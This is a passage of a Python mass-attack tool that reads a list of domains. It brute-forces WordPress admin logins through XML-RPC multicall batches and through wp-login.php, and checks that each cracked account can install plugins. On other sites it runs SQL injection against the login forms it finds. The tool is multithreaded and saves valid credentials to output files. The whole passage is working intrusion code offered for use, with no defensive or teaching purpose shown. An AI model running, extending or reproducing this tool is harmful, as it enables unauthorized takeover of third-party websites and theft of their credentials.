            r = self.s.get(bu, timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                           verify=False, allow_redirects=True)
            if r.status_code==200 and self._WP_SIG_RE.search(r.text):
                return True
        except Exception:
            pass
        for path in ("/wp-login.php","/xmlrpc.php","/wp-content/"):
            try:
                r = self.s.head(bu+path,
                                timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                                verify=False, allow_redirects=False)
                if r.status_code in (200,405):
                    return True
            except Exception:
                continue
        return False

    def xmlrpc_alive(self, bu:str) -> bool:
        try:
            r = self.s.post(
                bu+"/xmlrpc.php",
                data=self._listmethods_xml(),
                headers={"Content-Type":"text/xml"},
                timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                verify=False, allow_redirects=False,
            )
            return (r.status_code==200
                    and self._XMLRPC_ENABLED.search(r.text))
        except Exception:
            return False

    def xmlrpc_brute(self, bu:str):
        url   = bu+"/xmlrpc.php"
        BATCH = 8
        for i in range(0, len(WP_CREDS), BATCH):
            result = self._multicall(url, WP_CREDS[i:i+BATCH])
            if result:
                u, p = result
                if self._verify_admin_xmlrpc(url, u, p):
                    return result
        return None

    def _verify_admin_xmlrpc(self, url:str, user:str, passw:str) -> bool:
        """
        Verify admin + install_plugins via XML-RPC.
          1. wp.getUsersBlogs -> isAdmin == 1  (no user_id required)
          2. wp.getCapabilities -> install_plugins == true
        Both must pass.
        """
        xe = self._xe

        body_blogs = (
            '<?xml version="1.0"?><methodCall>'
            '<methodName>wp.getUsersBlogs</methodName><params>'
            f'<param><value><string>{xe(user)}</string></value></param>'
            f'<param><value><string>{xe(passw)}</string></value></param>'
            '</params></methodCall>'
        )
        try:
            r = self.s.post(url, data=body_blogs,
                            headers={"Content-Type":"text/xml"},
                            timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                            verify=False, allow_redirects=False)
            if r.status_code != 200:
                return False
            try:
                root = ET.fromstring(r.text.strip())
                if root.find(".//member/name[.='faultCode']") is not None:
                    return False
                is_admin = False
                for member_el in root.findall(".//member"):
                    n = member_el.find("name")
                    v = member_el.find(".//boolean")
                    if (n is not None and n.text == "isAdmin"
                            and v is not None and v.text.strip() == "1"):
                        is_admin = True
                        break
                if not is_admin:
                    return False
            except ET.ParseError:
                return False
        except Exception:
            return False

        body_cap = (
            '<?xml version="1.0"?><methodCall>'
            '<methodName>wp.getCapabilities</methodName><params>'
            '<param><value><string>1</string></value></param>'
            f'<param><value><string>{xe(user)}</string></value></param>'
            f'<param><value><string>{xe(passw)}</string></value></param>'
            '</params></methodCall>'
        )
        try:
            r2 = self.s.post(url, data=body_cap,
                             headers={"Content-Type":"text/xml"},
                             timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                             verify=False, allow_redirects=False)
            if r2.status_code != 200:
                return False
            try:
                root2 = ET.fromstring(r2.text.strip())
                if root2.find(".//member/name[.='faultCode']") is not None:
                    return False
                for member_el in root2.findall(".//member"):
                    n2 = member_el.find("name")
                    v2 = member_el.find(".//boolean")
                    if (n2 is not None and "install_plugins" in n2.text.lower()
                            and v2 is not None and v2.text.strip() == "1"):
                        return True
                return False
            except ET.ParseError:
                return False
        except Exception:
            return False

    def _multicall(self, url:str, creds:list):
        calls = "".join(
            "<value><struct>"
            "<member><name>methodName</name>"
            "<value><string>wp.getUsersBlogs</string></value></member>"
            "<member><name>params</name><value><array><data>"
            f"<value><string>{self._xe(u)}</string></value>"
            f"<value><string>{self._xe(p)}</string></value>"
            "</data></array></value></member>"
            "</struct></value>"
            for u,p in creds
        )
        body = (
            '<?xml version="1.0"?>'
            "<methodCall><methodName>system.multicall</methodName>"
            "<params><param><value><array><data>"
            f"{calls}"
            "</data></array></value></param></params></methodCall>"
        )
        try:
            r = self.s.post(url, data=body,
                            headers={"Content-Type":"text/xml"},
                            timeout=(TIMEOUT_CONNECT,TIMEOUT_READ+6),
                            verify=False, allow_redirects=False)
        except Exception:
            return None
        if r.status_code != 200:
            return None

        try:
            root = ET.fromstring(r.text.strip())
        except ET.ParseError:
            return None

        data_el = root.find("./params/param/value/array/data")
        if data_el is None:
            return None

        results = list(data_el)
        for i, val_el in enumerate(results):
            if i >= len(creds):
                break
            is_fault = any(
                m.text == "faultCode"
                for m in val_el.findall(".//member/name")
            )
            if is_fault:
                continue
            if val_el.find("./array") is not None or val_el.find(".//array") is not None:
                return creds[i]

        return None

    def wplogin_brute(self, bu:str):
        """
        Success detection: HTTP 302 Location → /wp-admin/
        OR wordpress_logged_in_* cookie.
        After login, verify admin + install_plugins via the REST API
        or wp-admin page content. No body-text guessing for auth.
        """
        login_url   = bu+"/wp-login.php"
        redirect_to = bu+"/wp-admin/"
        pre_cookies = {"wordpress_test_cookie":"WP Cookie check"}

        try:
            pre = self.s.get(login_url,
                             timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                             verify=False, allow_redirects=True)
            if pre.status_code != 200:
                return None
            m = re.search(
                r"name=[\"']redirect_to[\"'][^>]*value=[\"']([^\"']*)[\"']|"
                r"value=[\"']([^\"']*)[\"'][^>]*name=[\"']redirect_to[\"']",
                pre.text, re.I,
            )
            if m:
                redirect_to = m.group(1) or m.group(2) or redirect_to
            pre_cookies.update({c.name:c.value for c in pre.cookies})
        except Exception:
            pass

        for user, passw in WP_CREDS:
            data = {
                "log":user, "pwd":passw, "wp-submit":"Log In",
                "redirect_to":redirect_to, "testcookie":"1",
            }
            try:
                r = self.s.post(
                    login_url, data=data, cookies=pre_cookies,
                    timeout=(TIMEOUT_CONNECT,TIMEOUT_READ),
                    verify=False, allow_redirects=False,
                )
            except Exception:
                continue

            logged_in = False

            if r.status_code in (301,302,303,307,308):
                loc = r.headers.get("Location","")
                if "/wp-admin" in loc:
                    logged_in = True
                elif loc and "wp-login" not in loc and "login" not in loc.lower():
                    for ck in r.cookies:
                        if "wordpress_logged_in" in ck.name.lower():
                            logged_in = True
                            break

            if not logged_in:
                for ck in r.cookies:
                    if "wordpress_logged_in" in ck.name.lower():
                        logged_in = True
                        break

            if not logged_in:
                continue

            for ck in r.cookies:
                self.s.cookies.set(ck.name, ck.value)

            if self._verify_admin_wplogin(bu):
                return (user, passw)

        return None

    def _verify_admin_wplogin(self, bu:str) -> bool:
        """
        After wp-login.php auth, verify the session has install_plugins.
        Strategy: fetch /wp-admin/ with the authenticated session and check
        for "plugin-install.php" in the response body.
        Falls back to REST API /wp-json/wp/v2/users/me?context=edit.
        """
        try:
            r = self.s.get(
                bu + "/wp-admin/",
                timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                verify=False, allow_redirects=True,
            )
            if r.status_code == 200 and "wp-login" not in r.url.lower():
                body = r.text.lower()
                if "plugin-install.php" in body:
                    return True
        except Exception:
            pass

        try:
            r2 = self.s.get(
                bu + "/wp-admin/plugins.php",
                timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                verify=False, allow_redirects=True,
            )
            if r2.status_code == 200 and "wp-login" not in r2.url.lower():
                body2 = r2.text.lower()
                if ("plugin-install.php" in body2
                        or "add new plugin" in body2
                        or "upload plugin" in body2):
                    return True
        except Exception:
            pass

        try:
            r3 = self.s.get(
                bu + "/wp-json/wp/v2/users/me?context=edit",
                timeout=(TIMEOUT_CONNECT, TIMEOUT_READ),
                verify=False, allow_redirects=True,
            )
            if r3.status_code == 200:
                txt = r3.text
                if ('"install_plugins":true' in txt
                        or '"install_plugins": true' in txt):
                    return True
        except Exception:
            pass

        return False

    @staticmethod
    def _xe(s:str) -> str:
        return (s.replace("&","&amp;").replace("<","&lt;")
                 .replace(">","&gt;").replace('"',"&quot;")
                 .replace("'","&apos;"))

    @staticmethod
    def _listmethods_xml() -> str:
        return ('<?xml version="1.0"?><methodCall>'
                '<methodName>system.listMethods</methodName>'
                '<params></params></methodCall>')

class DomainProcessor:
    __slots__ = ("session","finder","sqli","wp")

    def __init__(self):
        self.session = make_session()
        self.finder  = LoginFinder(self.session)
        self.sqli    = SQLInjector(self.session)
        self.wp      = WordPressEngine(self.session)

    def run(self, raw:str) -> None:
        domain = normalize(raw)
        if not domain: return
        bu = domain

        if not is_alive(self.session, bu):
            vprint(bu,"Dead","dead")
            with _stats_lock: _stats["dead"] += 1
            return

        if self.wp.is_wordpress(bu):
            vprint(bu,"WordPress - Detected","wp")

            if self.wp.xmlrpc_alive(bu):
                vprint(bu,"WordPress - XML-RPC Alive","alive")
                vprint(bu,"WordPress - XML-RPC Brute","brute")
                creds = self.wp.xmlrpc_brute(bu)
                if creds:
                    self._hit_wp(bu,creds[0],creds[1],"XML-RPC")
                    return
                vprint(bu,"WordPress - XML-RPC Failed","fail")
            else:
                vprint(bu,"WordPress - XML-RPC Dead","warn")

            vprint(bu,"WordPress - wp-login.php Brute","brute")
            creds = self.wp.wplogin_brute(bu)
            if creds:
                self._hit_wp(bu,creds[0],creds[1],"WP-Login")
                return
            vprint(bu,"WordPress - Failed","fail")
            return

        form = self.finder.find(bu)
        if not form:
            if bu.startswith("https://"):
                bu_h = "http://"+bu[8:]
                form = self.finder.find(bu_h)
                if form: bu = bu_h

        if not form:
            vprint(bu,"No Login Form","noform")
            with _stats_lock: _stats["no_form"] += 1
            return

        vprint(bu,"Form Found - SQLi Injecting","sqli")
        result = self.sqli.test(form)
        if result:
            u = result["username"]; p = result["password"]
            vprint(bu,
                f"SQLi Successful  {C.DKGR}|{C.RST}  "
                f"{C.WHT}{u}{C.RST}  {C.DKGR}:{C.RST}  {C.LIME}{p}{C.RST}",
                "ok")
            save_sqli(result["login_url"],u,p)
            with _stats_lock: _stats["sqli"] += 1
        else:
            vprint(bu,"SQLi - Failed","fail")

    def _hit_wp(self, bu, user, passw, via):
        vprint(bu,
            f"Admin+Plugins Confirmed  {C.DKGR}|{C.RST}  "
            f"{C.WHT}{user}{C.RST}  {C.DKGR}:{C.RST}  {C.LIME}{passw}{C.RST}"
            f"  {C.DKGR}[{via}]{C.RST}",
            "ok")
        save_wp(bu, user, passw)
        key = "xmlrpc" if via == "XML-RPC" else "wp_login"
        with _stats_lock:
            _stats[key] += 1

    def close(self):
        try: self.session.close()
        except Exception: pass

def print_summary(elapsed:float, total:int) -> None:
    sep = f"  {C.E1}{'─'*64}{C.RST}"
    print(f"\n{sep}")
    print(f"  {C.E1}◆{C.RST}  {C.BLD}{C.WHT}SCAN COMPLETE{C.RST}")
    print(sep)
    print(f"  {C.GREY}Total Domains  {C.RST}  {C.WHT}{total}{C.RST}")
    print(f"  {C.GREY}Dead           {C.RST}  {C.DKGR}{_stats['dead']}{C.RST}")
    print(f"  {C.GREY}No Form        {C.RST}  {C.DKGR}{_stats['no_form']}{C.RST}")
    print(f"  {C.GREY}SQLi Valid     {C.RST}  {C.ORNG}{C.BLD}{_stats['sqli']}{C.RST}"
          f"   {C.GREY}→  {VALID_FILE}{C.RST}")
    print(f"  {C.GREY}WP XML-RPC     {C.RST}  {C.PURP}{C.BLD}{_stats['xmlrpc']}{C.RST}"
          f"   {C.GREY}→  {WP_FILE}{C.RST}")
    print(f"  {C.GREY}WP Login       {C.RST}  {C.PURP}{C.BLD}{_stats['wp_login']}{C.RST}"
          f"   {C.GREY}→  {WP_FILE}{C.RST}")
    print(f"  {C.GREY}Elapsed        {C.RST}  {C.WHT}{elapsed:.1f}s{C.RST}")
    print(f"{sep}\n")

def main() -> None:
    print_banner()

    try:
        fname = input(f"  {C.GOLD}Enter Your File Name: {C.RST}").strip()
    except (KeyboardInterrupt, EOFError):
        print(f"\n  {C.GREY}Aborted.{C.RST}"); sys.exit(0)

    if not os.path.isfile(fname):
        print(f"\n  {C.RED}[✘]  File not found: {fname}{C.RST}"); sys.exit(1)

    with open(fname,"r",encoding="utf-8",errors="ignore") as fh:
        domains = [ln.strip() for ln in fh
                   if ln.strip() and not ln.startswith("#")]

    if not domains:
        print(f"\n  {C.RED}[✘]  No entries found.{C.RST}"); sys.exit(1)

    total = len(domains)
    _stats["domains"] = total
    _init_files()

    sep = f"  {C.DKGR}{'─'*64}{C.RST}"
    print(f"{sep}")
    print(
        f"  {C.E1}◆{C.RST}  Loaded {C.WHT}{total}{C.RST} domains"
        f"   ·  Threads {C.WHT}{THREADS}{C.RST}"
        f"   ·  SQLi {C.WHT}{len(SQLI_PAYLOADS)}{C.RST}"
        f"   ·  WP creds {C.WHT}{len(WP_CREDS)}{C.RST}"
    )
    print(f"{sep}")
    print(f"  {C.GREY}  {'DOMAIN':<55}  STATUS{C.RST}")
    print(f"{sep}\n")

    start = time.time()

    def worker(raw:str) -> None:
        proc = DomainProcessor()
        try:    proc.run(raw)
        finally: proc.close(); del proc

    try:
        with ThreadPoolExecutor(max_workers=THREADS) as pool:
            futures = {pool.submit(worker,d):d for d in domains}
            for _ in as_completed(futures): pass
    except KeyboardInterrupt:
        print(f"\n\n  {C.YEL}[!]  Interrupted — partial results saved.{C.RST}")

    print_summary(time.time()-start, total)

if __name__ == "__main__":
    main()
